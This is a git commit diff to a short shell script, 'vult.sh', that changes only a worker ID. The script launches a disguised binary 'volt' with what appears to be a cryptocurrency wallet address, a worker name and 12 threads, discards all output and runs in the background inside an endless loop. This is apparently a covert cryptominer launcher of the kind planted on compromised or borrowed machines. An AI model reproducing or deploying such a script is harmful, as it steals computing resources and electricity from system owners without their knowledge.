080a9d05fa0fe2f89cd8ff3476a32417df1edd8b
mrsilkin1-del <mr.silkin1@fasdeil.com>
2026-05-18 19:38:12 +0700

    Update vult.sh

--- vult.sh
+++ vult.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-chmod 777 volt && nproc --all && ./volt --user 88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL --pass WORKER-04 --threads 12 >/dev/null 2>&1 &
+chmod 777 volt && nproc --all && ./volt --user 88c3RaaVjxzGX6vUgcSNqa1HgAJEh83XEKqhZswhv8LHFo9PjmxhXkE5ZpRW9W7c5GJpUVP4eURbnT4KesVN9eLg7rpWeGL --pass WORKER-05 --threads 12 >/dev/null 2>&1 &
 sleep 10
 while true
 do
